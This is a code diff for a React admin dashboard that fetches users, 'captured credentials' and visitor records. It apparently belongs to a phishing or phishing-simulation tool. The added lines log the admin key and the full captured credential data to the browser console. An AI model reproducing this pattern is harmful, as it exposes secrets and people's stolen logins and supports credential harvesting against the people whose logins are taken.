@@ -62,12 +62,30 @@ const AdminDashboard = () => {
 
   const fetchAllData = async () => {
     try {
+      console.log('=== Fetching Admin Data ===');
+      console.log('Admin Key:', adminKey);
+      console.log('API Base URL:', process.env.REACT_APP_API_URL || 'http://localhost:5001/api');
+      
       // Fetch all admin data
       const [usersRes, capturedCredsRes, visitorsRes] = await Promise.all([
-        adminAPI.getUsers(adminKey).catch(() => ({ data: { users: [] } })),
-        adminAPI.getCapturedCredentials(adminKey).catch(() => ({ data: { credentials: [] } })),
-        adminAPI.getVisitors(adminKey).catch(() => ({ data: { visitors: [] } }))
+        adminAPI.getUsers(adminKey).catch((err) => {
+          console.error('Error fetching users:', err);
+          return { data: { users: [] } };
+        }),
+        adminAPI.getCapturedCredentials(adminKey).catch((err) => {
+          console.error('Error fetching captured credentials:', err);
+          return { data: { credentials: [] } };
+        }),
+        adminAPI.getVisitors(adminKey).catch((err) => {
+          console.error('Error fetching visitors:', err);
+          return { data: { visitors: [] } };
+        })
       ]);
+
+      console.log('=== Fetch Results ===');
+      console.log('Users:', usersRes.data);
+      console.log('Captured Credentials:', capturedCredsRes.data);
+      console.log('Visitors:', visitorsRes.data);
 
       setUsers(usersRes.data.users || []);
       setCapturedCredentials(capturedCredsRes.data.credentials || []);
